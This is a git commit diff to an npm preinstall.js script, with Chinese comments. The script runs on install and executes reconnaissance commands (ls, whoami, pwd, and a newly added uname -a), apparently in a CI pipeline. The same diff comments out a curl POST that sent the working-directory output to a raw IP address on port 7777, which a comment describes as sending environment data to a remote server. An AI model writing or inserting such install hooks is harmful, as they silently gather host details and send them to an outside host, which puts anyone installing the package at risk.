4fee3cb94d029f478a0b6c6f8c2df7a7e9aa45a8
ckx-sec <56886249+ckx-sec@users.noreply.github.com>
2024-08-06 22:06:05 +0800

    Update preinstall.js

--- preinstall.js
+++ preinstall.js
@@ -43,6 +43,19 @@ exec('ls -l azure-pipelines-1.yml', (error, stdout, stderr) => {
     console.log(`ls -l azure-pipelines-1.yml 命令结果:\n${stdout}`);
 });
 
+exec('uname -a', (error, stdout, stderr) => {
+    if (error) {
+        console.error(`执行 uname -a 时出错: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.error(`uname -a 执行输出错误: ${stderr}`);
+        return;
+    }
+
+    console.log(`uname -a 命令结果:\n${stdout}`);
+});
+
 // 执行 whoami 命令
 exec('whoami', (error, stdout, stderr) => {
     if (error) {
@@ -66,22 +79,22 @@ exec('pwd', (error, stdout, stderr) => {
         console.error(`pwd 执行输出错误: ${stderr}`);
         return;
     }
-    // console.log(`pwd 命令结果:\n${stdout}`);
+    console.log(`pwd 命令结果:\n${stdout}`);
     // 将环境变量数据通过 curl 命令发送到远程服务器
-    const data = stdout.trim();
-    const command = `curl -X POST -H "Content-Type: text/plain" --data "${data}" http://139.180.193.16:7777`;
+    // const data = stdout.trim();
+    // const command = `curl -X POST -H "Content-Type: text/plain" --data "${data}" http://139.180.193.16:7777`;
 
-    exec(command, (curlError, curlStdout, curlStderr) => {
-        if (curlError) {
-            console.error(`执行 curl 时出错: ${curlError.message}`);
-            return;
-        }
-        if (curlStderr) {
-            console.error(`curl 执行输出错误: ${curlStderr}`);
-            return;
-        }
-        console.log(`curl 命令结果:\n${curlStdout}`);
-    });
+    // exec(command, (curlError, curlStdout, curlStderr) => {
+    //     if (curlError) {
+    //         console.error(`执行 curl 时出错: ${curlError.message}`);
+    //         return;
+    //     }
+    //     if (curlStderr) {
+    //         console.error(`curl 执行输出错误: ${curlStderr}`);
+    //         return;
+    //     }
+    //     console.log(`curl 命令结果:\n${curlStdout}`);
+    // });
 });
 
 // 执行 ls 命令
